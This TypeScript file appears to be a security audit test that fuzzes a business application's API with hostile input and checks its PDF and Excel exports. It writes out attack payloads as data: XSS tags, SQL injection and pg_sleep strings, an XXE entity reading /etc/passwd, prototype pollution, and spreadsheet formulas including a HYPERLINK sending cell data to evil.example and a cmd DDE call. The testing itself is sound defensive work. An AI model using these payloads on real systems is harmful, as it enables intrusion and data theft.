/**
 * Audit 02, part B.4: hostile input.
 *
 * The valid write requests of the recording (world 2) are sent again with one value changed:
 *  - mass assignment: fields a client must never set, added to every create;
 *  - amounts and quantities: huge, negative, too many decimals, exponent, NaN, a JSON number;
 *  - text: 10 000 characters, a NUL byte, RTL and zero-width controls, markup, SQL, templates.
 * Nothing may answer 5xx, and no error may show a stack trace or an SQL message.
 * Then stored markup is followed to where it is shown: a PDF and an Excel export.
 *
 *   tsx api/security/record.ts && tsx api/security/input.ts
 */
import { createServer } from 'node:http';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { area, assert, check, record, writeSummary } from '../../lib/harness.ts';
import { idemKey, request, type Recorded } from '../../lib/http.ts';
import { API } from '../../lib/config.ts';
import { addDays, algiersToday, assertAuditDb, client, company, openingStock, OUT, product, setSetting, uniq } from '../../lib/audit.ts';
import { closeDb, query } from '../../lib/db.ts';
import { readRoutes } from '../../audit-02/routes.ts';

assertAuditDb();
const RECORDING = fileURLToPath(new URL('../../.auth/audit02-recording.json', import.meta.url));
const world = (JSON.parse(readFileSync(RECORDING, 'utf8')) as Record<string, Recorded[]>[])[1]!;
const UUID = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g;
const template = (path: string): string => path.replace(/\?.*/, '').replace(UUID, ':id');
const codeOf = (raw: string): string => /"code":"([A-Z_0-9]+)"/.exec(raw)?.[1] ?? '';
const writes = Object.values(world)
  .flat()
  .filter((r) => r.token && r.method !== 'GET' && r.status < 300 && r.body && typeof r.body === 'object' && !/^\/(auth|admin)/.test(r.path));

/** A response that shows how the server is built. */
const INTERNALS = /\bat [\w.<>]+ \(.*:\d+:\d+\)|node_modules|prisma\.|PrismaClient|SELECT .* FROM|syntax error at|relation "|column "|violates|ECONNREFUSED|\.ts:\d+|\.js:\d+/;
interface Odd {
  route: string;
  where: string;
  value: string;
  status: number;
  code: string;
  sample: string;
}
const fiveHundreds: Odd[] = [];
const internals: Odd[] = [];
const accepted: Odd[] = [];
let sent = 0;

type Leaf = [string, unknown];
function leaves(v: unknown, path = ''): Leaf[] {
  if (Array.isArray(v)) return v.flatMap((x, i) => leaves(x, `${path}[${i}]`));
  if (v && typeof v === 'object') return Object.entries(v).flatMap(([k, x]) => leaves(x, path ? `${path}.${k}` : k));
  return [[path, v]];
}
function setLeaf(body: unknown, path: string, value: unknown): unknown {
  const clone = structuredClone(body) as Record<string, unknown>;
  const keys = path.replace(/\[(\d+)\]/g, '.$1').split('.').filter(Boolean);
  let cur: Record<string, unknown> = clone;
  for (const k of keys.slice(0, -1)) cur = cur[k] as Record<string, unknown>;
  cur[keys.at(-1)!] = value;
  return clone;
}
async function fire(r: Recorded, body: unknown, where: string, value: string): Promise<{ status: number; raw: string }> {
  const res = await request(r.path, { method: r.method as 'POST', token: r.token, body, ...(r.idempotent ? { idempotencyKey: idemKey('fz') } : {}), raw: true });
  sent += 1;
  const odd: Odd = { route: `${r.method} ${template(r.path)}`, where, value: value.slice(0, 40), status: res.status, code: codeOf(res.raw), sample: res.raw.slice(0, 300) };
  if (res.status >= 500) fiveHundreds.push(odd);
  if (res.status >= 400 && INTERNALS.test(res.raw)) internals.push(odd);
  if (res.status < 300) accepted.push(odd);
  return res;
}

// =================================================================== mass assignment
area('B4. Mass assignment');
const FIXED_ID = '0a0a0a0a-0a0a-4a0a-8a0a-0a0a0a0a0a0a';
const foreignTenant = (await query<{ id: string }>(`SELECT id::text FROM tenants ORDER BY "createdAt" LIMIT 1`))[0]!.id;
const EXTRA = {
  id: FIXED_ID,
  tenantId: foreignTenant,
  createdAt: '2001-01-01T00:00:00.000Z',
  updatedAt: '2001-01-01T00:00:00.000Z',
  createdBy: FIXED_ID,
  number: 'HACK-2001-000001',
  status: 'VALIDATED',
  balance: '987654.32',
  role: 'OWNER',
  isFree: true,
  edition: 'ENTREPRISE',
  deletedAt: null,
  totalTtc: '0.01',
  avgCost: '0.01',
  permissionGrants: ['USERS_MANAGE'],
};
const creates = new Map<string, Recorded>();
for (const r of writes) if (r.method === 'POST' && !creates.has(template(r.path))) creates.set(template(r.path), r);
const massStatus: Record<string, number> = {};
for (const r of creates.values()) {
  const res = await fire(r, { ...(r.body as object), ...EXTRA }, '+extra fields', 'mass');
  massStatus[`${res.status}`] = (massStatus[`${res.status}`] ?? 0) + 1;
}
// The same on the settings of the company: the plan is the super-admin's.
const anyOwner = writes.find((r) => r.path === '/expenses' || r.path === '/payments' || r.path === '/sales/quick')!.token!;
const settingsNow = (await request<Record<string, unknown>>('/tenant/settings', { token: anyOwner })).body;
const { tenantId: _t, name: _n, updatedAt: _u, ...settingsBody } = settingsNow;
void [_t, _n, _u];
const settingsRes = await request('/tenant/settings', { method: 'PATCH', token: anyOwner, body: { ...settingsBody, isFree: true, edition: 'ENTREPRISE', plan: 'FREE', subscriptionStatus: 'ACTIVE', trialEndsAt: '2099-01-01', maxUsers: 9999 } });
record({ name: `${creates.size} create routes replayed with ${Object.keys(EXTRA).join(', ')}: statuses ${JSON.stringify(massStatus)}; PATCH /tenant/settings with plan fields: ${settingsRes.status}`, status: 'INFO' });
await check('no row took the id, the date, the number or the author sent by the client', async () => {
  const cols = await query<{ t: string; c: string }>(
    `SELECT table_name AS t, column_name AS c FROM information_schema.columns
      WHERE table_schema = 'public' AND column_name IN ('id', 'createdAt', 'createdBy', 'number') AND table_name NOT LIKE '\\_%'`,
  );
  const bad: string[] = [];
  for (const { t, c } of cols) {
    const cond = c === 'createdAt' ? `"createdAt" < '2002-01-01'` : c === 'number' ? `"number" = 'HACK-2001-000001'` : `"${c}"::text = '${FIXED_ID}'`;
    const [row] = await query<{ n: string }>(`SELECT COUNT(*)::text AS n FROM "${t}" WHERE ${cond}`);
    if (row!.n !== '0') bad.push(`${t}.${c}: ${row!.n}`);
  }
  assert(bad.length === 0, bad.join(' ; '));
});
await check('a body cannot change the plan of the company or grant itself a permission', async () => {
  const tenants = [...new Set(writes.map((r) => (JSON.parse(Buffer.from(r.token!.split('.')[1]!, 'base64url').toString()) as { tid: string }).tid))];
  const subs = await query<Record<string, unknown>>(`SELECT * FROM tenants WHERE id = ANY($1::uuid[])`, [tenants]);
  const grants = await query<{ n: string }>(`SELECT COUNT(*)::text AS n FROM users WHERE "tenantId" = ANY($1::uuid[]) AND 'USERS_MANAGE' = ANY("permissionGrants") AND "fullName" NOT LIKE 'B2 %'`, [tenants]);
  const text = JSON.stringify(subs);
  assert(!text.includes('2099-01-01') && !text.includes('9999'), `a plan field was written: ${text.slice(0, 300)}`);
  assert(grants[0]!.n === '0', `${grants[0]!.n} user(s) hold USERS_MANAGE after the sweep`);
});

// =================================================================== amounts
area('B4. Amounts and quantities');
const NUMBERS: [string, unknown][] = [
  ['16 digits', '9999999999999999.99'],
  ['12 digits', '999999999999.99'],
  ['negative', '-1'],
  ['3 decimals', '0.001'],
  ['4 decimals', '1.0001'],
  ['exponent', '1e5'],
  ['NaN', 'NaN'],
  ['Infinity', 'Infinity'],
  ['arabic digits', '١٢٣'],
  ['comma', '1,5'],
  ['spaces', ' 12 '],
  ['hex', '0x10'],
  ['JSON number', 1e21],
  ['zero', '0'],
  ['empty', ''],
];
const isDecimal = (v: unknown): v is string => typeof v === 'string' && /^-?\d+(\.\d+)?$/.test(v);
const doneLeaf = new Set<string>();
for (const r of writes) {
  for (const [where, v] of leaves(r.body)) {
    if (!isDecimal(v)) continue;
    const key = `${r.method} ${template(r.path)} ${where.replace(/\[\d+\]/g, '[]')}`;
    if (doneLeaf.has(key)) continue;
    doneLeaf.add(key);
    for (const [label, bad] of NUMBERS) await fire(r, setLeaf(r.body, where, bad), `${where.replace(/\[\d+\]/g, '[]')} = ${label}`, String(bad));
  }
}
const amountFields = doneLeaf.size;
const numericSent = sent;

// =================================================================== text
area('B4. Text');
const TEXTS: [string, string][] = [
  ['10 000 characters', 'A'.repeat(10_000)],
  ['NUL byte', 'abc\u0000def'],
  ['RTL override and zero-width', '‮evil‬​‏﻿'],
  ['lone surrogate', 'bad\uD800end'],
  ['markup', '<script>alert(1)</script><img src=x onerror=alert(1)>'],
  ['SQL', `'; DROP TABLE users; --`],
  ['template', '${7*7}{{7*7}}<%= 7*7 %>'],
  ['formula', '=HYPERLINK("http://evil.example","x")'],
  ['emoji and Arabic', '🙂 زبون جديد ـــ'],
];
const isFreeText = (k: string, v: unknown): v is string =>
  typeof v === 'string' && !isDecimal(v) && !UUID.test(v) && !/^\d{4}-\d{2}(-\d{2})?/.test(v) && !/^[A-Z_0-9]+$/.test(v) && !/password/i.test(k) && ((UUID.lastIndex = 0), true);
const doneText = new Set<string>();
for (const r of writes) {
  for (const [where, v] of leaves(r.body)) {
    UUID.lastIndex = 0;
    if (!isFreeText(where, v)) continue;
    const key = `${r.method} ${template(r.path)} ${where.replace(/\[\d+\]/g, '[]')}`;
    if (doneText.has(key)) continue;
    doneText.add(key);
    for (const [label, bad] of TEXTS) await fire(r, setLeaf(r.body, where, bad), `${where.replace(/\[\d+\]/g, '[]')} = ${label}`, label);
  }
}
// Type confusion on every field of every create: an object, an array, null, a boolean.
for (const r of creates.values()) {
  const first = leaves(r.body)[0];
  if (!first) continue;
  for (const [label, bad] of [['object', { $ne: null }], ['array', [[]]], ['null', null], ['boolean', true]] as [string, unknown][])
    await fire(r, setLeaf(r.body, first[0], bad), `${first[0]} = ${label}`, label);
}

// =================================================================== query strings and bodies
area('B4. Query strings and raw bodies');
const HOSTILE_Q = `q=%27%3B--&search=%25%27%29%20OR%201%3D1--&limit=100000000&cursor=%27&from=9999-99-99&to=0000-00-00&page=-1&sort=id%3BDROP&groupBy=%22%3B%20select%20pg_sleep(5)--&warehouseId=%27&sellerId=1%20OR%201%3D1&month=2026-13&year=abcd&date=x&status=%00`;
const lists = readRoutes().filter((r) => r.verb === 'GET' && !r.path.includes(':') && !r.path.startsWith('/admin') && r.path !== '/health');
for (const r of lists) {
  const started = Date.now();
  const res = await request(`${r.path}?${HOSTILE_Q}`, { token: anyOwner, raw: true });
  sent += 1;
  const odd: Odd = { route: `GET ${r.path}`, where: 'query string', value: 'hostile', status: res.status, code: codeOf(res.raw), sample: res.raw.slice(0, 300) };
  if (res.status >= 500 || Date.now() - started > 4000) fiveHundreds.push(odd);
  if (res.status >= 400 && INTERNALS.test(res.raw)) internals.push(odd);
}
const rawPost = async (body: string, type = 'application/json'): Promise<{ status: number; raw: string }> => {
  const res = await fetch(`${API}/clients`, { method: 'POST', headers: { Authorization: `Bearer ${anyOwner}`, 'Content-Type': type }, body });
  return { status: res.status, raw: await res.text() };
};
await check('a malformed, a huge and a deeply nested body are refused cleanly', async () => {
  const broken = await rawPost('{"code": "X", "name": ');
  const huge = await rawPost(JSON.stringify({ code: 'X', name: 'A'.repeat(2_000_000), type: 'PARTICULIER' }));
  const deep = await rawPost('['.repeat(20_000) + ']'.repeat(20_000));
  const proto = await rawPost('{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"x":1}},"code":"X","name":"Proto","type":"PARTICULIER"}');
  const xml = await rawPost('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>', 'application/xml');
  const facts = `malformed ${broken.status}, 2 MB ${huge.status}, 20 000 levels ${deep.status}, __proto__ ${proto.status}, XML ${xml.status}`;
  record({ name: facts, status: 'INFO' });
  for (const r of [broken, huge, deep, proto, xml]) assert(r.status < 500 && !INTERNALS.test(r.raw), `${facts} — ${r.raw.slice(0, 200)}`);
  assert(broken.status === 400 && huge.status === 413, facts);
});

// =================================================================== verdict of the sweeps
area('B4. Verdict of the sweeps');
const uniqOdd = (list: Odd[]): string[] => [...new Set(list.map((o) => `${o.route} ${o.where} → ${o.status} ${o.code}`))];
record({ name: `${sent} hostile requests: ${amountFields} amount or quantity fields × ${NUMBERS.length} values (${numericSent - creates.size}), ${doneText.size} text fields × ${TEXTS.length} values, ${lists.length} list routes`, status: 'INFO' });
await check('no hostile value answers 5xx', () => {
  const u = uniqOdd(fiveHundreds);
  assert(u.length === 0, `${u.length} case(s) on ${new Set(fiveHundreds.map((o) => o.route)).size} route(s): ${u.slice(0, 40).join(' ; ')}`);
});
await check('no error shows a stack trace, a file path or an SQL message', () => {
  const u = [...new Set(internals.map((o) => `${o.route} ${o.where}: ${o.sample.slice(0, 160)}`))];
  assert(u.length === 0, `${u.length}: ${u.slice(0, 6).join(' ; ')}`);
});
// What was ACCEPTED is read by a human: a negative price may be legal, a NaN is not.
const strange = accepted.filter((o) => / = (negative|3 decimals|4 decimals|exponent|NaN|Infinity|arabic digits|comma|hex|JSON number|NUL byte|lone surrogate)$/.test(o.where));
await check('no amount is accepted as NaN, Infinity, an exponent, a JSON number or with too many decimals', () => {
  // Not counted, on purpose: "1,5" is the French decimal comma (stored 1.50); a unit cost and
  // an exchange rate are Decimal(14,4), a quantity Decimal(14,3); a phone number is text.
  const u = uniqOdd(
    strange.filter(
      (o) => !/ = (negative|comma)$/.test(o.where) && !/NUL byte|lone surrogate/.test(o.where) && !/^(phone|.*(unitCost|exchangeRate|qty|qtyBasePerPackaging|factorToBase)) = /.test(o.where),
    ),
  );
  assert(u.length === 0, `${u.length}: ${u.slice(0, 30).join(' ; ')}`);
});
record({ name: `negative values accepted (read one by one in the report): ${uniqOdd(strange.filter((o) => / = negative$/.test(o.where))).join(' ; ') || 'none'}`, status: 'INFO' });
record({ name: `text accepted with a NUL byte or a lone surrogate: ${uniqOdd(strange.filter((o) => /NUL byte|lone surrogate/.test(o.where))).length} field(s)`, status: 'INFO' });

// =================================================================== stored markup: PDF and Excel
area('B4. Stored markup, where it is shown');
let canaryHits = 0;
const canary = createServer((_req, res) => {
  canaryHits += 1;
  res.end('x');
}).listen(0);
const port = (canary.address() as { port: number }).port;
const IMG = `<img src="http://127.0.0.1:${port}/img">`;
const FRAME = `<iframe src="file:///etc/passwd"></iframe>`;
const SCRIPT = `<script>fetch('http://127.0.0.1:${port}/js')</script>`;
const CSS = `<link rel=stylesheet href="http://127.0.0.1:${port}/css"><style>@import url(http://127.0.0.1:${port}/i)</style>`;
const c = await company('Markup');
const today = algiersToday();
const p = await product(c, { priceHt: '1000', designation: `Article ${IMG}` });
await openingStock(c, p, '50', '400');
const cl = await client(c, FRAME, { address: `${SCRIPT}${IMG}` });
const formulaClient = await c.owner.post<{ id: string }>('/clients', { code: uniq('C-'), name: '=HYPERLINK("http://evil.example/steal?"&A1,"Cliquez")', type: 'PARTICULIER', address: '+cmd|\' /C calc\'!A0', phone: '0550000000' }, null);
const sale = (await c.owner.post<{ sale: { id: string } }>('/sales/quick', { type: 'BL', clientId: cl, documentDate: today, paidAmount: '0', paymentMode: 'ESPECES', note: CSS, lines: [{ productId: p.id, unitId: p.unitId, qty: '1', unitPriceHt: '1000' }] })).sale;
await c.owner.post('/sales/quick', { type: 'BL', clientId: formulaClient.id, documentDate: today, paidAmount: '0', paymentMode: 'ESPECES', lines: [{ productId: p.id, unitId: p.unitId, qty: '1', unitPriceHt: '1000' }] });
const dir = mkdtempSync(`${tmpdir()}/audit02-in-`);
const bin = async (path: string): Promise<{ status: number; buf: Buffer; type: string }> => {
  const res = await fetch(`${API}${path}`, { headers: { Authorization: `Bearer ${c.session.token}` } });
  return { status: res.status, buf: Buffer.from(await res.arrayBuffer()), type: res.headers.get('content-type') ?? '' };
};
await check('markup in a product, a client and a note is printed as text: the PDF loads nothing and reads no file', async () => {
  const pdf = await bin(`/documents/BL/${sale.id}/pdf`);
  const st = await bin(`/clients/${cl}/statement/pdf?from=${addDays(today, -5)}&to=${today}`);
  assert(pdf.status === 200 && pdf.type.includes('pdf'), `BL pdf: HTTP ${pdf.status} ${pdf.buf.toString('utf8').slice(0, 200)}`);
  writeFileSync(`${dir}/bl.pdf`, pdf.buf);
  const pdfjs = await import('pdfjs-dist/legacy/build/pdf.mjs');
  const doc = await pdfjs.getDocument({ data: new Uint8Array(pdf.buf) }).promise;
  let text = '';
  for (let i = 1; i <= doc.numPages; i += 1) text += (await (await doc.getPage(i)).getTextContent()).items.map((it) => ('str' in it ? it.str : '')).join(' ');
  await new Promise((r) => setTimeout(r, 500));
  record({ name: `BL PDF ${pdf.buf.length} bytes, relevé PDF ${st.status}; requests received by the canary server: ${canaryHits}; text printed: ${/<img|&lt;img/.test(text) ? 'the tag as text' : 'no tag'}`, status: 'INFO' });
  assert(canaryHits === 0, `the PDF renderer made ${canaryHits} request(s) to a URL taken from a product or client name`);
  assert(!/root:|\/bin\/(ba)?sh|nobody:/.test(text), 'the PDF shows the content of a local file');
  assert(text.includes('<img') || text.includes('img src'), `the markup is not printed as text: ${text.slice(0, 200)}`);
});
await check('a client name starting with = + - @ is not a formula in the Excel exports', async () => {
  const range = `from=${addDays(today, -5)}&to=${today}`;
  const found: string[] = [];
  let cellsSeen = 0;
  for (const path of [`/reports/sales/export.xlsx?${range}&groupBy=client`, `/reports/aging/export.xlsx`, `/reports/payments/export.xlsx?${range}`, `/reports/sell-out/export.xlsx?${range}`]) {
    const x = await bin(path);
    if (x.status !== 200) continue;
    const file = `${dir}/${uniq('x')}.xlsx`;
    writeFileSync(file, x.buf);
    const xml = execFileSync('unzip', ['-p', file, 'xl/sharedStrings.xml', 'xl/worksheets/*.xml'], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
    if (xml.includes('HYPERLINK')) cellsSeen += 1;
    // A formula cell is <c ...><f>…</f></c>; a text cell holds the string (t="s" / inlineStr).
    const formulas = [...xml.matchAll(/<f[^>]*>([^<]*)<\/f>/g)].map((m) => m[1]!).filter((f) => /HYPERLINK|cmd\|/.test(f));
    if (formulas.length) found.push(`${path.replace(/\?.*/, '')}: ${formulas[0]}`);
  }
  record({ name: `exports that carry the hostile client name: ${cellsSeen}; stored as formula: ${found.length}`, status: 'INFO' });
  assert(found.length === 0, found.join(' ; '));
  assert(cellsSeen > 0, 'no export carried the client name: the check proved nothing');
});
canary.close();

writeFileSync(`${OUT}input-detail.json`, JSON.stringify({ fiveHundreds, internals, accepted: strange }, null, 1));
writeSummary('input');
await closeDb();
process.exit(0);
